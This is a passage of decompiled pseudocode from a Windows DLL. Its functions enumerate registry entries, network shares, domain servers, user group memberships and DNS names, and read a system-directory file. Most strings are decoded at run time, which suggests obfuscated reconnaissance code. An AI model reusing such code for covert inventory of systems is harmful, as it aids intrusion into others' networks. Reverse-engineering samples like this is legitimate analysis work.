      strncpy((char *)(*(_DWORD *)Name + 4), &pszPath[40], v6);
      v8 = strlen(lpSubKey);
      strncat(Destination, lpSubKey, v8);
      PathAddBackslashA(Destination);
      if ( strlen(&pszPath[40]) >= 0x2D )
        v9 = 45;
      else
        v9 = strlen(&pszPath[40]);
      strncat(Destination, &pszPath[40], v9);
      v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001DA04);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v10, v7, 16) )
        **(_DWORD **)Name = GetLastError();
      v11 = (const CHAR *)sub_1000C0E0((int)&unk_1001DA24);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v11, v7 - 16, 16) )
        **(_DWORD **)Name = GetLastError();
      v12 = (const CHAR *)sub_1000C0E0((int)&unk_1001DA44);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v12, v7 + 16, 16) )
        **(_DWORD **)Name = GetLastError();
      v13 = (const CHAR *)sub_1000C0E0((int)&unk_1001DA68);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v13, v7 + 64, 16) )
        **(_DWORD **)Name = GetLastError();
      v14 = (const CHAR *)sub_1000C0E0((int)&unk_1001DA88);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v14, v7 + 48, 16) )
        **(_DWORD **)Name = GetLastError();
      v15 = (const CHAR *)sub_1000C0E0((int)&unk_1001DAB0);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v15, v7 + 32, 16) )
        **(_DWORD **)Name = GetLastError();
      v16 = (const CHAR *)sub_1000C0E0((int)&unk_1001DAD4);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, Destination, v16, v7 + 80, 16) )
        break;
LABEL_28:
      ++dwIndex;
      *(_DWORD *)Name += 164;
      v1 = (int)v30;
    }
    LastError = GetLastError();
LABEL_27:
    **(_DWORD **)Name = LastError;
    goto LABEL_28;
  }
  *(_DWORD *)(v1 + 20436) = v2;
LABEL_30:
  if ( phkResult )
    RegCloseKey(phkResult);
  hKey = 0;
  v17 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, v28, 0, 0x20019u, &hKey);
  if ( v17 )
  {
    *(_DWORD *)(v1 + 20436) = v17;
  }
  else
  {
    memset(pszPath, 0, 86);
    memset(Name, 0, sizeof(Name));
    v39 = 0;
    LOBYTE(v17) = (_BYTE)v30 + 109;
    v34 = 0;
    dwIndex = 0;
    lpSubKey = v30 + 22125;
    while ( (!v34 || v34 == 234) && (int)dwIndex < 25 )
    {
      ftLastWriteTime.dwLowDateTime = 0;
      ftLastWriteTime.dwHighDateTime = 0;
      cchName = 5;
      v18 = strlen(pszPath);
      memset(pszPath, 0, v18);
      v19 = strlen(Name);
      memset(Name, 0, v19);
      v17 = RegEnumKeyExA(hKey, dwIndex, Name, &cchName, 0, 0, 0, &ftLastWriteTime);
      v34 = v17;
      if ( !v17 )
      {
        v20 = strlen(v28);
        strncat(pszPath, v28, v20);
        PathAddBackslashA(pszPath);
        if ( strlen(Name) >= 5 )
          v21 = 5;
        else
          v21 = strlen(Name);
        strncat(pszPath, Name, v21);
        v22 = (BYTE *)lpSubKey;
        v26 = (BYTE *)(lpSubKey - 45);
        v23 = (const CHAR *)sub_1000C0E0((int)&unk_1001DAF8);
        if ( !sub_1000273E(HKEY_LOCAL_MACHINE, pszPath, v23, v26, 45) )
          *((_DWORD *)v30 + 5109) = GetLastError();
        v24 = (const CHAR *)sub_1000C0E0((int)&unk_1001DB20);
        LOBYTE(v17) = sub_1000273E(HKEY_LOCAL_MACHINE, pszPath, v24, v22, 45);
        if ( !(_BYTE)v17 )
        {
          v17 = GetLastError();
          *((_DWORD *)v30 + 5109) = v17;
        }
      }
      ++dwIndex;
      lpSubKey += 90;
    }
  }
  if ( hKey )
    LOBYTE(v17) = RegCloseKey(hKey);
  return v17;
}

//----- (1000799A) --------------------------------------------------------
DWORD __thiscall sub_1000799A(int this)
{
  unsigned int v1; // ebx
  const CHAR *v3; // eax
  LSTATUS v4; // eax
  size_t v5; // eax
  size_t v6; // eax
  const CHAR *v7; // eax
  HMODULE LibraryA; // esi
  DWORD result; // eax
  const CHAR *v10; // eax
  FARPROC ProcAddress; // eax
  _DWORD *v12; // ecx
  char *i; // eax
  unsigned int v14; // edx
  int v15; // [esp+Ch] [ebp-80h] BYREF
  DWORD cchValueName; // [esp+10h] [ebp-7Ch] BYREF
  char *Destination; // [esp+14h] [ebp-78h]
  DWORD dwIndex; // [esp+18h] [ebp-74h]
  HKEY phkResult; // [esp+1Ch] [ebp-70h] BYREF
  unsigned int v20; // [esp+20h] [ebp-6Ch] BYREF
  char v21; // [esp+28h] [ebp-64h] BYREF
  CHAR ValueName[52]; // [esp+7550h] [ebp+74C4h] BYREF

  v1 = 0;
  v15 = 30000;
  phkResult = 0;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001DBF0);
  v4 = RegOpenKeyExA(HKEY_LOCAL_MACHINE, v3, 0, 0x20019u, &phkResult);
  if ( v4 )
  {
    *(_DWORD *)(this + 644) = v4;
  }
  else
  {
    dwIndex = 0;
    cchValueName = 52;
    memset(ValueName, 0, sizeof(ValueName));
    Destination = (char *)(this + 660);
    do
    {
      if ( RegEnumValueA(phkResult, dwIndex, ValueName, &cchValueName, 0, 0, 0, 0) )
        break;
      v5 = strlen(ValueName) <= 0x34 ? strlen(ValueName) : 52;
      strncpy(Destination, ValueName, v5);
      ++dwIndex;
      Destination += 64;
      cchValueName = 52;
      v6 = strlen(ValueName);
      memset(ValueName, 0, v6);
    }
    while ( dwIndex < 0xF );
  }
  if ( phkResult )
    RegCloseKey(phkResult);
  v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001DBCC);
  LibraryA = LoadLibraryA(v7);
  if ( LibraryA
    && (v10 = (const CHAR *)sub_1000C0E0((int)&unk_1001DC48), (ProcAddress = GetProcAddress(LibraryA, v10)) != 0) )
  {
    if ( ((int (__stdcall *)(unsigned int *, int *, int))ProcAddress)(&v20, &v15, 1) )
    {
      *(_DWORD *)(this + 644) = GetLastError();
    }
    else
    {
      v12 = (_DWORD *)(this + 652);
      for ( i = &v21; ; i += 56 )
      {
        v14 = 15;
        if ( v20 < 0xF )
          v14 = v20;
        if ( v1 >= v14 )
          break;
        *(v12 - 1) = *((_DWORD *)i - 1);
        *v12 = *(_DWORD *)i;
        v12[1] = *((_DWORD *)i + 2);
        ++v1;
        v12 += 16;
      }
    }
    return FreeLibrary(LibraryA);
  }
  else
  {
    result = GetLastError();
    *(_DWORD *)(this + 644) = result;
  }
  return result;
}

//----- (10007B5A) --------------------------------------------------------
DWORD __thiscall sub_10007B5A(CHAR *this)
{
  HMODULE LibraryA; // eax
  HMODULE v3; // esi
  DWORD result; // eax
  LPBYTE v5; // esi
  CHAR *v6; // edi
  DWORD v7; // eax
  int v8; // eax
  FARPROC ProcAddress; // [esp+Ch] [ebp-80h]
  HMODULE hLibModule; // [esp+10h] [ebp-7Ch]
  DWORD totalentries; // [esp+14h] [ebp-78h] BYREF
  DWORD entriesread; // [esp+18h] [ebp-74h] BYREF
  unsigned int v13; // [esp+1Ch] [ebp-70h]
  LPBYTE bufptr; // [esp+20h] [ebp-6Ch] BYREF
  CHAR MultiByteStr[264]; // [esp+24h] [ebp-68h] BYREF

  bufptr = 0;
  entriesread = 0;
  totalentries = 0;
  LibraryA = LoadLibraryA(lpModuleName);
  v3 = LibraryA;
  hLibModule = LibraryA;
  if ( LibraryA )
  {
    ProcAddress = GetProcAddress(LibraryA, dword_10026CFC);
    if ( !ProcAddress || NetShareEnum(0, 0x1F6u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries, 0) )
    {
      *((_DWORD *)this + 402) = GetLastError();
      return FreeLibrary(v3);
    }
    else
    {
      v13 = 0;
      if ( bufptr )
      {
        v5 = bufptr + 20;
        v6 = this + 1613;
        do
        {
          v7 = entriesread;
          if ( entriesread >= 0x14 )
            v7 = 20;
          if ( v13 >= v7 )
            break;
          memset(MultiByteStr, 0, 0x105u);
          WideCharToMultiByte(0, 0, *((LPCWCH *)v5 - 5), -1, MultiByteStr, 260, 0, 0);
          lstrcpynA(v6 + 1, MultiByteStr, 60);
          v8 = *(_DWORD *)v5;
          if ( *(_DWORD *)v5 > 0xFFu )
            LOBYTE(v8) = -1;
          *v6 = v8;
          *(v6 - 1) = *(v5 - 16);
          memset(MultiByteStr, 0, 0x105u);
          WideCharToMultiByte(0, 0, *((LPCWCH *)v5 + 1), -1, MultiByteStr, 260, 0, 0);
          lstrcpynA(v6 + 62, MultiByteStr, 60);
          memset(MultiByteStr, 0, 0x105u);
          WideCharToMultiByte(0, 0, *((LPCWCH *)v5 - 3), -1, MultiByteStr, 260, 0, 0);
          lstrcpynA(v6 + 123, MultiByteStr, 60);
          ++v13;
          v5 += 40;
          v6 += 185;
        }
        while ( v5 != (LPBYTE)20 );
        if ( bufptr )
          ((void (__stdcall *)(LPBYTE))ProcAddress)(bufptr);
      }
      return FreeLibrary(hLibModule);
    }
  }
  else
  {
    result = GetLastError();
    *((_DWORD *)this + 402) = result;
  }
  return result;
}

//----- (10007D20) --------------------------------------------------------
HMODULE __thiscall sub_10007D20(int this)
{
  unsigned int v1; // ebx
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  int v5; // eax
  const CHAR *v6; // eax
  HMODULE result; // eax
  const CHAR *v8; // eax
  FARPROC ProcAddress; // eax
  char *v10; // esi
  unsigned int *v11; // edi
  int v12; // [esp+8h] [ebp-80h] BYREF
  DWORD cbData; // [esp+Ch] [ebp-7Ch] BYREF
  HMODULE hModule; // [esp+10h] [ebp-78h]
  HKEY phkResult; // [esp+14h] [ebp-74h] BYREF
  char v16[268]; // [esp+18h] [ebp-70h] BYREF
  char v17; // [esp+124h] [ebp+9Ch] BYREF
  BYTE Data[264]; // [esp+400h] [ebp+378h] BYREF

  v1 = 0;
  cbData = 260;
  phkResult = 0;
  v12 = 1000;
  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001DC70);
  if ( RegOpenKeyExA(HKEY_LOCAL_MACHINE, v3, 0, 0x20019u, &phkResult)
    || (v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001DCB4), RegQueryValueExA(phkResult, v4, 0, 0, Data, &cbData)) )
  {
    *(_DWORD *)(this + 5312) = GetLastError();
  }
  else
  {
    v5 = cbData;
    if ( cbData >= 0x64 )
      v5 = 100;
    lstrcpynA((LPSTR)(this + 5328), (LPCSTR)Data, v5);
  }
  v6 = (const CHAR *)sub_1000C0E0((int)&unk_1001DCD4);
  result = LoadLibraryA(v6);
  hModule = result;
  if ( result )
  {
    v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001DCF8);
    ProcAddress = GetProcAddress(hModule, v8);
    if ( ProcAddress && !((int (__stdcall *)(char *, int *))ProcAddress)(v16, &v12) )
    {
      v10 = &v17;
      v11 = (unsigned int *)(this + 5316);
      do
      {
        if ( v1 >= 3 )
          break;
        *v11 = inet_addr(v10 + 4);
        v10 = *(char **)v10;
        ++v1;
        ++v11;
      }
      while ( v10 );
    }
    result = (HMODULE)FreeLibrary(hModule);
  }
  if ( phkResult )
    return (HMODULE)RegCloseKey(phkResult);
  return result;
}
// 10007D20: using guessed type char var_4F4[268];

//----- (10007E63) --------------------------------------------------------
DWORD __thiscall sub_10007E63(const CHAR *this)
{
  const CHAR *v2; // ebx
  DWORD result; // eax
  HANDLE FileA; // eax
  DWORD FileSize; // eax
  const CHAR *v6; // ebx
  PSTR v7; // eax
  const CHAR *v8; // eax
  CHAR *v9; // edi
  int v10; // eax
  DWORD NumberOfBytesRead; // [esp+10h] [ebp-80h] BYREF
  HANDLE hFile; // [esp+14h] [ebp-7Ch]
  CHAR Buffer[268]; // [esp+18h] [ebp-78h] BYREF

  v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001DD68);
  NumberOfBytesRead = 0;
  if ( !GetSystemDirectoryA(Buffer, 0x104u)
    || (PathAddBackslashA(Buffer),
        lstrcatA(Buffer, v2),
        FileA = CreateFileA(Buffer, 0x80000000, 3u, 0, 3u, 0, 0),
        hFile = FileA,
        FileA == (HANDLE)-1) )
  {
    result = GetLastError();
    *((_DWORD *)this + 2651) = result;
  }
  else
  {
    FileSize = GetFileSize(FileA, 0);
    if ( FileSize == -1 )
      goto LABEL_8;
    if ( FileSize >= 0xFA0 )
      FileSize = 4000;
    v6 = this + 10608;
    if ( ReadFile(hFile, (LPVOID)(this + 10608), FileSize, &NumberOfBytesRead, 0) )
    {
      while ( 1 )
      {
        v8 = StrChrA(v6, 0x23u);
        v9 = (CHAR *)v8;
        if ( !v8 )
          break;
        v7 = StrChrA(v8, 0xAu);
        if ( !v7 )
        {
          v10 = lstrlenA(v9);
          memset(v9, 32, v10);
          return CloseHandle(hFile);
        }
        memset(v9, 32, v7 - v9 + 1);
      }
    }
    else
    {
LABEL_8:
      *((_DWORD *)this + 2651) = GetLastError();
    }
    return CloseHandle(hFile);
  }
  return result;
}

//----- (10007F8E) --------------------------------------------------------
LSTATUS __thiscall sub_10007F8E(char *this)
{
  LSTATUS result; // eax
  const CHAR *v2; // eax
  size_t v3; // eax
  struct _FILETIME ftLastWriteTime; // [esp+4h] [ebp-80h] BYREF
  char *v5; // [esp+Ch] [ebp-78h]
  LPCSTR lpString2; // [esp+10h] [ebp-74h]
  DWORD dwIndex; // [esp+14h] [ebp-70h]
  void *v8; // [esp+18h] [ebp-6Ch]
  DWORD cchName; // [esp+1Ch] [ebp-68h] BYREF
  unsigned int v10; // [esp+20h] [ebp-64h]
  int v11; // [esp+24h] [ebp-60h]
  HKEY phkResult; // [esp+28h] [ebp-5Ch] BYREF
  BYTE Data[5000]; // [esp+2Ch] [ebp-58h] BYREF
  CHAR ValueName[264]; // [esp+13B4h] [ebp+1330h] BYREF
  CHAR Name[264]; // [esp+14BCh] [ebp+1438h] BYREF
  CHAR String1[264]; // [esp+15C4h] [ebp+1540h] BYREF

  v5 = this;
  lpString2 = (LPCSTR)sub_1000C0E0((int)&unk_1001DD90);
  phkResult = 0;
  result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, lpString2, 0, 8u, &phkResult);
  if ( !result )
  {
    dwIndex = 0;
    cchName = 260;
    v11 = 0;
    if ( !RegEnumKeyExA(phkResult, 0, Name, &cchName, 0, 0, 0, &ftLastWriteTime) )
    {
      do
      {
        ++dwIndex;
        cchName = 261;
        lstrcpynA(String1, lpString2, 260);
        PathAddBackslashA(String1);
        lstrcatA(String1, Name);
        v10 = 0;
        v8 = &v5[21 * v11 + 14612];
        do
        {
          if ( v11 >= 10 )
            break;
          v2 = (const CHAR *)sub_1000C0E0((int)&unk_1001DDD4);
          lstrcpynA(ValueName, v2, 260);
          ValueName[10] = v10 + 48;
          memset(Data, 0, sizeof(Data));
          if ( !sub_1000273E(HKEY_LOCAL_MACHINE, String1, ValueName, Data, 5000) )
            break;
          v3 = *(_DWORD *)&Data[16];
          if ( *(_DWORD *)&Data[16] > 0x14u )
            v3 = 20;
          memcpy(v8, &Data[20], v3);
          v8 = (char *)v8 + 21;
          ++v11;
          ++v10;
        }
        while ( v10 <= 9 );
      }
      while ( !RegEnumKeyExA(phkResult, dwIndex, Name, &cchName, 0, 0, 0, &ftLastWriteTime) );
    }
    return RegCloseKey(phkResult);
  }
  return result;
}

//----- (1000813F) --------------------------------------------------------
int __stdcall sub_1000813F(int a1, _DWORD *a2, _DWORD *a3)
{
  int result; // eax
  _DWORD *i; // edx
  _DWORD *v5; // eax

  result = 0;
  if ( *a3 )
  {
    for ( i = a3 + 129; *i != a1; i += 215 )
    {
      if ( (unsigned int)++result >= *a3 )
        return result;
    }
    v5 = &a3[215 * result];
    a2[1] = v5[141];
    result = v5[140];
    *a2 = result;
  }
  return result;
}

//----- (1000818A) --------------------------------------------------------
char __stdcall sub_1000818A(char *Buf1, _WORD *a2, _WORD *a3, int *a4)
{
  const void *v4; // eax
  int v5; // esi
  const void *v6; // eax
  __int16 v8; // cx
  int v9; // [esp+14h] [ebp-78h] BYREF
  int piRet; // [esp+18h] [ebp-74h] BYREF
  int v11; // [esp+1Ch] [ebp-70h] BYREF
  char v12; // [esp+23h] [ebp-69h]
  CHAR String1[260]; // [esp+24h] [ebp-68h] BYREF

  *a2 = 0;
  *a3 = 0;
  *a4 = 0;
  v12 = 0;
  v4 = (const void *)sub_1000C0E0((int)&unk_1001DE38);
  if ( !memcmp(Buf1, v4, 3u) )
  {
    v12 = 1;
  }
  else
  {
    v6 = (const void *)sub_1000C0E0((int)&unk_1001DE50);
    if ( memcmp(Buf1, v6, 3u) )
      return 1;
  }
  memset(String1, 0, sizeof(String1));
  lstrcpyA(String1, a0x);
  memcpy(&String1[2], Buf1 + 8, 4u);
  piRet = 0;
  if ( StrToIntExA(String1, 1, &piRet) )
  {
    v11 = 0;
    memcpy(&String1[2], Buf1 + 17, 4u);
    if ( StrToIntExA(String1, 1, &v11) )
    {
      v9 = 0;
      if ( v12 )
      {
        v5 = 1;
      }
      else
      {
        memcpy(&String1[2], Buf1 + 29, 8u);
        if ( !StrToIntExA(String1, 1, &v9) )
          return 0;
        v5 = v9;
      }
      v8 = piRet;
      if ( piRet > 0 && v11 > 0 && piRet <= 0xFFFF && v11 <= 0xFFFF )
      {
        *a3 = v11;
        *a2 = v8;
        *a4 = v5;
        return 1;
      }
    }
  }
  return 0;
}

//----- (1000830F) --------------------------------------------------------
char __stdcall sub_1000830F(char *Str)
{
  int v1; // esi
  char *SubStr[5]; // [esp+8h] [ebp-14h]

  SubStr[0] = (char *)sub_1000C0E0((int)&unk_1001DF5C);
  SubStr[1] = (char *)sub_1000C0E0((int)&unk_1001DF7C);
  SubStr[2] = (char *)sub_1000C0E0((int)&unk_1001DF98);
  SubStr[3] = (char *)sub_1000C0E0((int)&unk_1001DFB4);
  SubStr[4] = (char *)sub_1000C0E0((int)&unk_1001DFD0);
  v1 = 0;
  while ( !strstr(Str, SubStr[v1]) )
  {
    if ( (unsigned int)++v1 >= 5 )
      return 0;
  }
  return 1;
}

//----- (10008385) --------------------------------------------------------
DWORD __stdcall sub_10008385(wchar_t *a1, wchar_t *a2, _BYTE *a3, const WCHAR *a4, const CHAR *a5)
{
  DWORD LocalGroups; // eax
  size_t v6; // eax
  size_t v7; // eax
  DWORD v8; // esi
  int v10; // esi
  DWORD LastError; // [esp+14h] [ebp-40h]
  DWORD totalentries; // [esp+18h] [ebp-3Ch] BYREF
  wchar_t *Source; // [esp+1Ch] [ebp-38h]
  wchar_t *String; // [esp+20h] [ebp-34h]
  DWORD entriesread; // [esp+24h] [ebp-30h] BYREF
  LPBYTE bufptr; // [esp+28h] [ebp-2Ch] BYREF
  char v17; // [esp+2Fh] [ebp-25h]
  WCHAR username[50]; // [esp+30h] [ebp-24h] BYREF
  WCHAR WideCharStr[16]; // [esp+94h] [ebp+40h] BYREF

  Source = a1;
  String = a2;
  bufptr = 0;
  entriesread = 0;
  totalentries = 0;
  LastError = 0;
  memset(username, 0, 98);
  memset(WideCharStr, 0, 30);
  if ( a4 )
  {
    LocalGroups = NetUserGetLocalGroups(a4, String, 0, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries);
  }
  else
  {
    if ( wcslen(Source) <= 0x1E )
      v6 = wcslen(Source);
    else
      v6 = 30;
    wcsncpy(username, Source, v6 + 1);
    wcsncat(username, ::Source, 2u);
    if ( wcslen(String) <= 0x14 )
      v7 = wcslen(String);
    else
      v7 = 20;
    wcsncat(username, String, v7 + 1);
    LocalGroups = NetUserGetLocalGroups(0, username, 0, 1u, &bufptr, 0xFFFFFFFF, &entriesread, &totalentries);
  }
  v8 = LocalGroups;
  if ( LocalGroups )
  {
    if ( bufptr )
      NetApiBufferFree(bufptr);
    return v8;
  }
  else
  {
    v17 = 0;
    if ( MultiByteToWideChar(0, 0, a5, -1, WideCharStr, 15) )
    {
      v10 = 0;
      if ( entriesread )
      {
        while ( lstrcmpiW(*(LPCWSTR *)&bufptr[4 * v10], WideCharStr) )
        {
          if ( ++v10 >= entriesread )
            goto LABEL_21;
        }
        v17 = 1;
      }
    }
    else
    {
      LastError = GetLastError();
    }
LABEL_21:
    if ( bufptr )
      NetApiBufferFree(bufptr);
    *a3 = v17;
    return LastError;
  }
}

//----- (10008515) --------------------------------------------------------
struct hostent *__stdcall sub_10008515(char *name)
{
  struct hostent *v2; // esi
  struct WSAData WSAData; // [esp+4h] [ebp-194h] BYREF

  memset(&WSAData, 0, sizeof(WSAData));
  if ( WSAStartup(0x101u, &WSAData) )
    return 0;
  v2 = gethostbyname(name);
  WSACleanup();
  return v2;
}

//----- (10008581) --------------------------------------------------------
void __stdcall sub_10008581(HMODULE hModule, int a2, void *a3)
{
  FARPROC v3; // eax
  int (__cdecl *v4)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD); // edi
  char *p_pExceptionObject; // eax
  void *v6; // eax
  void *v7; // esi
  _ThrowInfo *v8; // [esp-4h] [ebp-88h]
  int (*ProcAddress)(void); // [esp+1Ch] [ebp-68h]
  FARPROC v10; // [esp+20h] [ebp-64h]
  int v11; // [esp+24h] [ebp-60h]
  char pExceptionObject; // [esp+2Bh] [ebp-59h] BYREF
  char v13; // [esp+2Ch] [ebp-58h] BYREF
  char v14; // [esp+2Dh] [ebp-57h] BYREF
  char v15; // [esp+2Eh] [ebp-56h] BYREF
  char v16; // [esp+2Fh] [ebp-55h]
  char v17[80]; // [esp+30h] [ebp-54h] BYREF
  int v18; // [esp+80h] [ebp-4h]

  if ( a3 && a2 )
  {
    v18 = 0;
    ProcAddress = GetProcAddress(hModule, lpProcName);
    v10 = GetProcAddress(hModule, dword_10026CF8);
    v3 = GetProcAddress(hModule, dword_10026CEC);
    v4 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD))v3;
    if ( !ProcAddress || !v10 || !v3 )
    {
      v16 = 0;
      v14 = 0;
      _CxxThrowException(&v14, &_TI1_AVCgqgEwvkptzgl__);
    }
    LOBYTE(v18) = 1;
    v11 = ProcAddress();
    if ( v11 == -1 )
    {
      v16 = 0;
      pExceptionObject = 0;
      v8 = &_TI1_AVCgqgEwvkptzgl__;
      p_pExceptionObject = &pExceptionObject;
      goto LABEL_8;
    }
    memset(v17, -86, 0x40u);
    v6 = operator new(0x5Cu);
    v7 = v6;
    if ( !v6 )
    {
      v16 = 0;
      v15 = 0;
      _CxxThrowException(&v15, &_TI1_AVCgqgEwvkptzgl__);
    }
    v8 = (_ThrowInfo *)500;
    *((_DWORD *)v6 + 4) = v17;
    *((_WORD *)v6 + 6) = 64;
    if ( !v4(v11, ***(_DWORD ***)(a2 + 12), v17, 64, 0, v6, 92) )
    {
      v16 = 0;
      v13 = 0;
      p_pExceptionObject = &v13;
LABEL_8:
      _CxxThrowException(p_pExceptionObject, v8);
    }
    memcpy(a3, v7, 0x1Cu);
    v18 = 0;
    ((void (__cdecl *)(int))v10)(v11);
    if ( v7 )
      j__free(v7);
  }
  sub_1000E612();
}
// 100086D3: conditional instruction was optimized away because %var_60.4!=FFFFFFFF

//----- (1000870D) --------------------------------------------------------
unsigned int __thiscall sub_1000870D(CHAR *this, char a2)
{
  HMODULE ModuleHandleA; // eax
  unsigned int result; // eax
  CHAR *i; // edi
  BYTE *v6; // esi
  const WCHAR *v7; // esi
  struct hostent *v8; // eax
  int v9; // esi
  const CHAR *v10; // [esp-4h] [ebp-60h]
  DWORD resume_handle; // [esp+8h] [ebp-54h] BYREF
  FARPROC ProcAddress; // [esp+Ch] [ebp-50h]
  DWORD totalentries[2]; // [esp+10h] [ebp-4Ch] BYREF
  int v14; // [esp+18h] [ebp-44h]
  unsigned int v15; // [esp+1Ch] [ebp-40h]
  DWORD entriesread; // [esp+20h] [ebp-3Ch] BYREF
  HMODULE hLibModule; // [esp+24h] [ebp-38h]
  LPBYTE bufptr; // [esp+28h] [ebp-34h] BYREF
  WCHAR String1[22]; // [esp+2Ch] [ebp-30h] BYREF

  totalentries[1] = (DWORD)this;
  ModuleHandleA = GetModuleHandleA(lpModuleName);
  if ( ModuleHandleA
    && (ProcAddress = GetProcAddress(ModuleHandleA, dword_10026CFC)) != 0
    && (bufptr = 0,
        entriesread = 0,
        totalentries[0] = 0,
        resume_handle = 0,
        !NetServerEnum(0, 0x65u, &bufptr, 0xFFFFFFFF, &entriesread, totalentries, 0xFFFFFFFF, 0, &resume_handle)) )
  {
    v10 = lpLibFileName;
    *((_DWORD *)this + 3707) = entriesread;
    *((_DWORD *)this + 3708) = totalentries[0];
    hLibModule = LoadLibraryA(v10);
    v15 = 0;
    v14 = 0;
    for ( i = this + 14864; ; i += 112 )
    {
      result = entriesread;
      if ( entriesread >= 0x32 )
        result = 50;
      if ( v15 >= result )
        break;
      v6 = &bufptr[v14];
      *((_DWORD *)i - 3) = *(_DWORD *)&bufptr[v14 + 8];
      *((_DWORD *)i - 2) = *((_DWORD *)v6 + 3);
      *((_DWORD *)i - 1) = *((_DWORD *)v6 + 4);
      lstrcpynW(String1, *((LPCWSTR *)v6 + 1), 16);
      WideCharToMultiByte(0, 0, String1, -1, i - 28, 15, 0, 0);
      v7 = (const WCHAR *)*((_DWORD *)v6 + 5);
      if ( v7 )
      {
        lstrcpynW(String1, v7, 21);
        WideCharToMultiByte(0, 0, String1, -1, i, 15, 0, 0);
      }
      if ( a2 )
      {
        v8 = sub_10008515(i - 28);
        v9 = (int)v8;
        if ( v8 )
        {
          memcpy(i + 21, v8->h_name, 0x1Fu);
          sub_10008581(hLibModule, v9, i + 52);
        }
        if ( *((_DWORD *)i - 3) == 5 && *((_DWORD *)i - 2) == 1 )
        {
          if ( sub_1000C58C((int)(i - 28)) )
            *((_DWORD *)i + 20) = 2;
        }
      }
      ++v15;
      v14 += 24;
    }
    if ( hLibModule )
      result = FreeLibrary(hLibModule);
    if ( bufptr )
      return ((int (__stdcall *)(LPBYTE))ProcAddress)(bufptr);
  }
  else
  {
    result = GetLastError();
    *((_DWORD *)this + 3706) = result;
  }
  return result;
}

//----- (10008981) --------------------------------------------------------
bool __stdcall sub_10008981(char *a1, LPCSTR lpString2, LPBYTE lpData)
{
  const CHAR *v3; // eax
  const CHAR *v4; // eax
  const CHAR *v5; // eax
  bool result; // al
  const CHAR *v7; // eax
  const CHAR *v8; // eax
  BYTE v9[4]; // [esp+14h] [ebp-78h] BYREF
  BYTE Data[264]; // [esp+18h] [ebp-74h] BYREF
  CHAR String1[264]; // [esp+120h] [ebp+94h] BYREF

  v3 = (const CHAR *)sub_1000C0E0((int)&unk_1001DE70);
  lstrcpynA(String1, v3, 260);
  lstrcatA(String1, lpString2);
  PathAddBackslashA(String1);
  v4 = (const CHAR *)sub_1000C0E0((int)&unk_1001DED8);
  lstrcatA(String1, v4);
  if ( lpData )
  {
    v5 = (const CHAR *)sub_1000C0E0((int)&unk_1001DEF8);
    sub_1000273E(HKEY_LOCAL_MACHINE, String1, v5, lpData, 100);
  }
  result = 1;
  if ( !sub_1000830F(a1) )
  {
    v7 = (const CHAR *)sub_1000C0E0((int)&unk_1001DF1C);
    if ( !sub_1000273E(HKEY_LOCAL_MACHINE, String1, v7, Data, 260) || !sub_1000830F((char *)Data) )
    {
      *(_DWORD *)v9 = 0;
      v8 = (const CHAR *)sub_1000C0E0((int)&unk_1001DF38);
      if ( !sub_1000273E(HKEY_LOCAL_MACHINE, String1, v8, v9, 4) || *(_DWORD *)v9 != 2 )
        return 0;
    }
  }
  return result;
}

//----- (10008AC4) --------------------------------------------------------
DWORD __stdcall sub_10008AC4(int a1, unsigned int a2, int a3, int a4, _DWORD *a5, HMODULE hModule, char a7)
{
  _DWORD *v7; // edi
  HMODULE LibraryA; // eax
  HMODULE v9; // ebx
  unsigned int v11; // eax
  unsigned int v12; // ebx
  int v13; // eax
  int v14; // ecx
  unsigned int v15; // edx
  unsigned int v16; // eax
  _DWORD *v17; // edi
  int v18; // esi
  unsigned int v19; // edx
  char *v20; // ebx
  size_t v21; // ecx
  size_t v22; // eax
  unsigned int v23; // eax
  struct hostent *v24; // eax
  size_t v25; // ecx
  size_t v26; // eax
  int v27; // edx
  int v28; // eax
  int v29; // eax
  int v30; // eax
  int v31; // eax
  DWORD LastError; // esi
  HMODULE hLibModule; // [esp+Ch] [ebp-50h]
  int v34; // [esp+10h] [ebp-4Ch]
  int v35; // [esp+14h] [ebp-48h]
  int v36; // [esp+18h] [ebp-44h]
  FARPROC v37; // [esp+20h] [ebp-3Ch]
  unsigned int v38; // [esp+24h] [ebp-38h]
  int v39; // [esp+28h] [ebp-34h]
  int v40; // [esp+2Ch] [ebp-30h]
  int v41; // [esp+30h] [ebp-2Ch]
  FARPROC ProcAddress; // [esp+34h] [ebp-28h]
  int v43; // [esp+38h] [ebp-24h]
  const wchar_t **v44; // [esp+3Ch] [ebp-20h]
  int v45; // [esp+3Ch] [ebp-20h]
  int v46; // [esp+3Ch] [ebp-20h]
  unsigned int v47; // [esp+40h] [ebp-1Ch]
  size_t v48; // [esp+44h] [ebp-18h]
  int v49; // [esp+44h] [ebp-18h]
  int v50; // [esp+48h] [ebp-14h]
  int v51; // [esp+4Ch] [ebp-10h]
  unsigned int v52; // [esp+50h] [ebp-Ch] BYREF
  int v53; // [esp+54h] [ebp-8h] BYREF
  char v54; // [esp+5Bh] [ebp-1h]

  if ( !a1 )
    return -1;
  v7 = a5;
  if ( !a5 )
    return -1;
  LibraryA = LoadLibraryA(lpModuleName);
  v9 = LibraryA;
  hLibModule = LibraryA;
  if ( !LibraryA )
    return GetLastError();
  ProcAddress = GetProcAddress(LibraryA, dword_10026CFC);
  v37 = GetProcAddress(v9, dword_10026D08);
